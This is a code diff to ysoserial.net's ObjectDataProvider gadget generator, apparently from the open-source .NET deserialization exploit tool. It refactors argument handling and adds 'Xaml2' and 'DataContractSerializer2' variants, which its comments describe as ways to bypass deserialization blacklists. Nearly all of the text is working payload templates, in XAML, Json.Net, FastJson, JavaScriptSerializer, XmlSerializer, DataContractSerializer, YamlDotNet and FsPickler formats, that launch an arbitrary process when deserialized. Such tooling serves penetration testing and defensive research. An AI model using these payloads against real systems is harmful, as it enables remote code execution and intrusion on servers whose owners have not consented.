@@ -13,6 +13,18 @@ using System.Diagnostics;
 using System.Windows.Data;
 using System.Reflection;
 using System.Collections.Specialized;
+using System.Windows;
+using ysoserial.Helpers;
+
+/*
+ * NOTEs:
+ *  What is Xaml2? 
+ *      Xaml2 uses ResourceDictionary in addition to just using ObjectDataProvider as in Xaml
+ *  What is DataContractSerializer2? 
+ *      DataContractSerializer2 uses Xaml.Parse rather than using ObjectDataProvider directly (as in DataContractSerializer) which is useful for bypassing blacklists
+ * 
+ * 
+ * */
 
 namespace ysoserial.Generators
 {
@@ -25,7 +37,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "Xaml", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer", "DataContractSerializer", "YamlDotNet < 5.0.0", "FsPickler" };
+            return new List<string> { "Xaml", "Xaml2", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer", "DataContractSerializer", "DataContractSerializer2", "YamlDotNet < 5.0.0", "FsPickler" };
         }
 
         public override string Name()
@@ -33,23 +45,29 @@ namespace ysoserial.Generators
             return "ObjectDataProvider";
         }
 
-        public override string Credit()
+        public override string Finders()
         {
             return "Oleksandr Mirosh and Alvaro Munoz";
         }
 
-        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify)
+        public override List<string> Labels()
         {
-            if (formatter.ToLower().Equals("xaml"))
+            return new List<string> { GadgetTypes.NotBridgeNotDerived };
+        }
+        
+        public override object Generate(string formatter, InputArgs inputArgs)
+        {
+            // NOTE: What is Xaml2? Xaml2 uses ResourceDictionary in addition to just using ObjectDataProvider as in Xaml
+            if (formatter.ToLower().Equals("xaml") || formatter.ToLower().Equals("xaml2"))
             {
                 ProcessStartInfo psi = new ProcessStartInfo();
-                Boolean hasArgs;
-                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, out hasArgs);
-                psi.FileName = splittedCMD[0];
-                if (hasArgs)
+                
+                psi.FileName = inputArgs.CmdFileName;
+                if (inputArgs.HasArguments)
                 {
-                    psi.Arguments = splittedCMD[1];
+                    psi.Arguments = inputArgs.CmdArguments;
                 }
+
                 StringDictionary dict = new StringDictionary();
                 psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
                 Process p = new Process();
@@ -59,21 +77,30 @@ namespace ysoserial.Generators
                 odp.IsInitialLoadEnabled = false;
                 odp.ObjectInstance = p;
 
-                string payload = XamlWriter.Save(odp);
+                string payload = "";
 
-                if (minify)
+                if (formatter.ToLower().Equals("xaml2"))
+                {
+                    ResourceDictionary myResourceDictionary = new ResourceDictionary();
+                    myResourceDictionary.Add("", odp);
+                    payload = XamlWriter.Save(myResourceDictionary);
+                }
+                else
+                {
+                    payload = XamlWriter.Save(odp);
+                }
+                
+                if (inputArgs.Minify)
                 {
                     // using discardable regex array to make it shorter!
-                    payload = Helpers.XMLMinifier.Minify(payload, null, new String[] { @"StandardErrorEncoding=.*LoadUserProfile=""False"" ", @"IsInitialLoadEnabled=""False"" " });
+                    payload = XMLMinifier.Minify(payload, null, new String[] { @"StandardErrorEncoding=.*LoadUserProfile=""False"" ", @"IsInitialLoadEnabled=""False"" " });
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
-                        StringReader stringReader = new StringReader(payload);
-                        XmlReader xmlReader = XmlReader.Create(stringReader);
-                        XamlReader.Load(xmlReader);
+                        SerializersHelper.Xaml_deserialize(payload);
                     }
                     catch
                     {
@@ -83,16 +110,17 @@ namespace ysoserial.Generators
             }
             if (formatter.ToLower().Equals("json.net"))
             {
-                Boolean hasArgs;
-                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.JSON, out hasArgs);
+                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;
 
-                if (hasArgs)
+                string cmdPart = "";
+
+                if (inputArgs.HasArguments)
                 {
-                    cmd = "'" + splittedCMD[0] + "', '" + splittedCMD[1] + "'";
+                    cmdPart = "'" + inputArgs.CmdFileName + "', '" + inputArgs.CmdArguments + "'";
                 }
                 else
                 {
-                    cmd = "'" + splittedCMD[0] + "'";
+                    cmdPart = "'" + inputArgs.CmdFileName + "'";
                 }
 
                 String payload = @"{
@@ -100,23 +128,27 @@ namespace ysoserial.Generators
     'MethodName':'Start',
     'MethodParameters':{
         '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
-        '$values':[" + cmd + @"]
+        '$values':[" + cmdPart + @"]
     },
     'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
 }";
-                if (minify)
+                if (inputArgs.Minify)
                 {
-                    payload = Helpers.JSONMinifier.Minify(payload, new String[] { "PresentationFramework", "mscorlib", "System" }, null);
+                    if (inputArgs.UseSimpleType)
+                    {
+                        payload = JSONMinifier.Minify(payload, new String[] { "PresentationFramework", "mscorlib", "System" }, null);
+                    }
+                    else
+                    {
+                        payload = JSONMinifier.Minify(payload, null, null);
+                    }
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
-                        Object obj = JsonConvert.DeserializeObject<Object>(payload, new JsonSerializerSettings
-                        {
-                            TypeNameHandling = TypeNameHandling.Auto
-                        }); ;
+                        SerializersHelper.JsonNet_deserialize(payload);
                     }
                     catch
                     {
@@ -126,18 +158,17 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("fastjson"))
             {
-                Boolean hasArgs;
-                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.JSON, out hasArgs);
+                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;
 
                 String cmdPart;
 
-                if (hasArgs)
+                if (inputArgs.HasArguments)
                 {
-                    cmdPart = @"""FileName"":""" + splittedCMD[0] + @""",""Arguments"":""" + splittedCMD[1] + @"""";
+                    cmdPart = @"""FileName"":""" + inputArgs.CmdFileName + @""",""Arguments"":""" + inputArgs.CmdArguments + @"""";
                 }
                 else
                 {
-                    cmdPart = @"""FileName"":""" + splittedCMD[0] + @"""";
+                    cmdPart = @"""FileName"":""" + inputArgs.CmdFileName + @"""";
                 }
 
                 String payload = @"{
@@ -157,12 +188,12 @@ namespace ysoserial.Generators
     ""MethodName"":""Start""
 }";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
-                    payload = Helpers.JSONMinifier.Minify(payload, null, null);
+                    payload = JSONMinifier.Minify(payload, null, null);
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
@@ -177,18 +208,17 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("javascriptserializer"))
             {
-                Boolean hasArgs;
-                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.JSON, out hasArgs);
+                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;
 
                 String cmdPart;
 
-                if (hasArgs)
+                if (inputArgs.HasArguments)
                 {
-                    cmdPart = "'FileName':'" + splittedCMD[0] + "', 'Arguments':'" + splittedCMD[1] + "'";
+                    cmdPart = "'FileName':'" + inputArgs.CmdFileName + "', 'Arguments':'" + inputArgs.CmdArguments + "'";
                 }
                 else
                 {
-                    cmdPart = "'FileName':'" + splittedCMD[0] + "'";
+                    cmdPart = "'FileName':'" + inputArgs.CmdFileName + "'";
                 }
 
                 String payload = @"{
@@ -203,17 +233,16 @@ namespace ysoserial.Generators
     }
 }";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
-                    payload = Helpers.JSONMinifier.Minify(payload, null, null);
+                    payload = JSONMinifier.Minify(payload, null, null);
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
-                        JavaScriptSerializer jss = new JavaScriptSerializer(new SimpleTypeResolver());
-                        var json_req = jss.Deserialize<Object>(payload);
+                        SerializersHelper.JavaScriptSerializer_deserialize(payload);
                     }
                     catch
                     {
@@ -223,19 +252,17 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("xmlserializer"))
             {
-
-                Boolean hasArgs;
-                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.XML, out hasArgs);
+                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;
 
                 String cmdPart;
 
-                if (hasArgs)
+                if (inputArgs.HasArguments)
                 {
-                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{splittedCMD[0]}</b:String><b:String>{splittedCMD[1]}</b:String>";
+                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String><b:String>{inputArgs.CmdArguments}</b:String>";
                 }
                 else
                 {
-                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{splittedCMD[0]}</b:String>";
+                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String>";
                 }
 
                 String payload = $@"<?xml version=""1.0""?>
@@ -255,21 +282,69 @@ namespace ysoserial.Generators
 </root>
 ";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
-                    payload = Helpers.XMLMinifier.Minify(payload, null, null);
+                    payload = XMLMinifier.Minify(payload, null, null, FormatterType.XMLSerializer, true);
                 }
 
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
-                        var xmlDoc = new XmlDocument();
-                        xmlDoc.LoadXml(payload);
-                        XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode("root");
-                        var s = new XmlSerializer(Type.GetType(xmlItem.GetAttribute("type")));
-                        var d = s.Deserialize(new XmlTextReader(new StringReader(xmlItem.InnerXml)));
+                        SerializersHelper.XMLSerializer_deserialize(payload, null, "root");
+                    }
+                    catch
+                    {
+                    }
+                }
+                return payload;
+            }
+            else if (formatter.ToLower().Equals("datacontractserializer2"))
+            {
+                // This by mixing what we had already in xmlserializer and datacontractserializer
+                // this can be useful to bypass deserializers that are based on a blacklist
+                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;
+
+                String cmdPart;
+
+                if (inputArgs.HasArguments)
+                {
+                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String><b:String>{inputArgs.CmdArguments}</b:String>";
+                }
+                else
+                {
+                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String>";
+                }
+
+                String payload = $@"<?xml version=""1.0""?>
+<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
+    <ExpandedWrapperOfXamlReaderObjectDataProviderRexb2zZW xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"">
+      <ExpandedElement z:Id=""ref1"" >
+        <__identity xsi:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System""/>
+      </ExpandedElement>
+        <ProjectedProperty0 xmlns:a=""http://schemas.datacontract.org/2004/07/System.Windows.Data"">
+            <a:MethodName>Parse</a:MethodName>
+            <a:MethodParameters>
+                <anyType xsi:type=""xsd:string"" xmlns=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">
+                    <![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{{d:Type c:Process}}"" MethodName=""Start"">{cmdPart}</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
+                </anyType>
+            </a:MethodParameters>
+            <a:ObjectInstance z:Ref=""ref1""/>
+        </ProjectedProperty0>
+    </ExpandedWrapperOfXamlReaderObjectDataProviderRexb2zZW>
+</root>
+";
+                if (inputArgs.Minify)
+                {
+                    payload = XMLMinifier.Minify(payload, null, null, FormatterType.DataContractXML, true);
+                }
+
+                if (inputArgs.Test)
+                {
+                    try
+                    {
+                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root");
                     }
                     catch
                     {
@@ -279,29 +354,28 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("datacontractserializer"))
             {
-
-                Boolean hasArgs;
-                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.XML, out hasArgs);
+                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;
 
                 String cmdPart;
 
-                if (hasArgs)
+                if (inputArgs.HasArguments)
                 {
-                    cmdPart = $@"<b:anyType i:type=""c:string"">" + splittedCMD[0] + @"</b:anyType>
-          <b:anyType i:type=""c:string"">" + splittedCMD[1] + "</b:anyType>";
+                    cmdPart = $@"<b:anyType i:type=""c:string"">" + inputArgs.CmdFileName + @"</b:anyType>
+          <b:anyType i:type=""c:string"">" + inputArgs.CmdArguments + "</b:anyType>";
                 }
                 else
                 {
-                    cmdPart = $@"<b:anyType i:type=""c:string"" xmlns:c=""http://www.w3.org/2001/XMLSchema"">" + splittedCMD[0] + @"</b:anyType>";
+                    cmdPart = $@"<anyType i:type=""c:string"" xmlns=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">" + inputArgs.CmdFileName + @"</anyType>";
                 }
 
                 String payload = $@"<?xml version=""1.0""?>
-<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
+<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]],System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
     <ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal"" 
                                                          xmlns:c=""http://www.w3.org/2001/XMLSchema""
                                                          xmlns:i=""http://www.w3.org/2001/XMLSchema-instance""
-                                                         xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"">
-      <ExpandedElement z:Id=""ref1"" xmlns:a=""http://schemas.datacontract.org/2004/07/System.Diagnostics"">
+                                                         xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/""
+                                                         >
+      <ExpandedElement z:Id=""ref1"" >
         <__identity i:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System""/>
       </ExpandedElement>
       <ProjectedProperty0 xmlns:a=""http://schemas.datacontract.org/2004/07/System.Windows.Data"">
@@ -314,20 +388,16 @@ namespace ysoserial.Generators
     </ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL>
 </root>
 ";
-                if (minify)
+                if (inputArgs.Minify)
                 {
-                    payload = Helpers.XMLMinifier.Minify(payload, null, null, Helpers.FormatterType.DataContractXML);
+                    payload = XMLMinifier.Minify(payload, null, null, FormatterType.DataContractXML, true);
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
-                        var xmlDoc = new XmlDocument();
-                        xmlDoc.LoadXml(payload);
-                        XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode("root");
-                        var s = new DataContractSerializer(Type.GetType(xmlItem.GetAttribute("type")));
-                        var d = s.ReadObject(new XmlTextReader(new StringReader(xmlItem.InnerXml)));
+                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root");
                     }
                     catch
                     {
@@ -337,20 +407,18 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("yamldotnet"))
             {
-
-                Boolean hasArgs;
-                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.YamlDotNet, out hasArgs);
-
+                inputArgs.CmdType = CommandArgSplitter.CommandType.YamlDotNet;
+                
                 String cmdPart;
 
-                if (hasArgs)
+                if (inputArgs.HasArguments)
                 {
-                    cmdPart = $@"FileName: " + splittedCMD[0] + @",
-					Arguments: " + splittedCMD[1];
+                    cmdPart = $@"FileName: " + inputArgs.CmdFileName + @",
+					Arguments: " + inputArgs.CmdArguments;
                 }
                 else
                 {
-                    cmdPart = $@"FileName: " + splittedCMD[0];
+                    cmdPart = $@"FileName: " + inputArgs.CmdFileName;
                 }
 
                 String payload = @"
@@ -365,21 +433,17 @@ namespace ysoserial.Generators
                 }
         }
 }";
-                if (minify)
+                
+                if (inputArgs.Minify)
                 {
-                    payload = Helpers.YamlDocumentMinifier.Minify(payload);
+                    payload = YamlDocumentMinifier.Minify(payload);
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
-                        //to bypass all of the vulnerable version's type checking, we need to set up a stream
-                        using (var reader = new StreamReader(new MemoryStream(System.Text.Encoding.UTF8.GetBytes(payload))))
-                        {
-                            var deserializer = new DeserializerBuilder().Build();
-                            var result = deserializer.Deserialize(reader);
-                        }
+                        SerializersHelper.YamlDotNet_deserialize(payload);
                     }
                     catch
                     {
@@ -389,23 +453,22 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("fspickler"))
             {
-                Boolean hasArgs;
-                string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.XML, out hasArgs);
-
+                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;
+                
                 String cmdPart;
 
-                if (hasArgs)
+                if (inputArgs.HasArguments)
                 {
-                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{splittedCMD[0]}</b:String><b:String>{splittedCMD[1]}</b:String>";
+                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String><b:String>{inputArgs.CmdArguments}</b:String>";
                 }
                 else
                 {
-                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{splittedCMD[0]}</b:String>";
+                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String>";
                 }
 
                 String internalPayload = @"<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{d:Type c:Process}"" MethodName=""Start"">" + cmdPart + @"</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>";
 
-                internalPayload = Helpers.CommandArgSplitter.JsonString(internalPayload);
+                internalPayload = CommandArgSplitter.JsonStringEscape(internalPayload);
 
                 String payload = @"{
   ""FsPickler"": ""4.0.0"",
@@ -443,12 +506,12 @@ namespace ysoserial.Generators
     }
   }";
 
-                if (minify)
+                if (inputArgs.Minify)
                 {
-                    payload = Helpers.JSONMinifier.Minify(payload, null, null);
+                    payload = JSONMinifier.Minify(payload, null, null);
                 }
 
-                if (test)
+                if (inputArgs.Test)
                 {
                     try
                     {
